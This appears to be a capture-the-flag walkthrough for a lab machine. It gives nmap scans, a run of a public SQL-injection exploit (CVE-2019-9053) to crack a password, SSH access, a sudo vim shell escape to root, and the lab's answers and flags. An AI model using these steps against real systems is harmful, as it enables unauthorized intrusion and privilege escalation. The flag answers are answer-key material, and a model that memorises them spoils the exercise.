Scan all tcp ports on target machine
```
─# nmap -p- 10.10.85.90 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-11-13 00:51 UTC
Nmap scan report for ip-10-10-85-90.eu-west-1.compute.internal (10.10.85.90)
Host is up (0.00071s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1
MAC Address: 02:D1:DE:7B:02:ED (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 105.00 seconds
```

Scan port 21, 80 and 2222 along with checking the version and software running on the port. 
The scan will also include running scripts from the nmap scripts module. 
```
└─# nmap -p 21,80,2222 -sVC 10.10.85.90 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-11-13 00:56 UTC
Nmap scan report for ip-10-10-85-90.eu-west-1.compute.internal (10.10.85.90)
Host is up (0.00028s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.163.213
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 294269149ecad917988c27723acda923 (RSA)
|   256 9bd165075108006198de95ed3ae3811c (ECDSA)
|_  256 12651b61cf4de575fef4e8d46e102af6 (ED25519)
MAC Address: 02:D1:DE:7B:02:ED (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.37 seconds
```

```
python3 46635.py -u http://10.10.221.99/simple --crack -w best110.txt
```

```
ssh mitch@10.10.221.99 -p 2222 
password: secret
```

```
cd /home/mitch
cat user.txt
```

```
sudo -l 
sudo vim -c ':!/bin/sh'
cd /root 
cat root.txt 
```
#### Questions

How many services are running under port 1000?  
```
2
```

What is running on the higher port?  
```
2222
```

What's the CVE you're using against the application?  
```
CVE-2019-9053
```

To what kind of vulnerability is the application vulnerable?  
```
sqli
```

What's the password?  
```
secret
```

Where can you login with the details obtained?  
```
ssh 
```

What's the user flag?  
```
G00d j0b, keep up!
```

Is there any other user in the home directory? What's its name?  
```
sunbath
```

What can you leverage to spawn a privileged shell?  
```
vim
```

What's the root flag?
```
W3ll d0n3. You made it!
```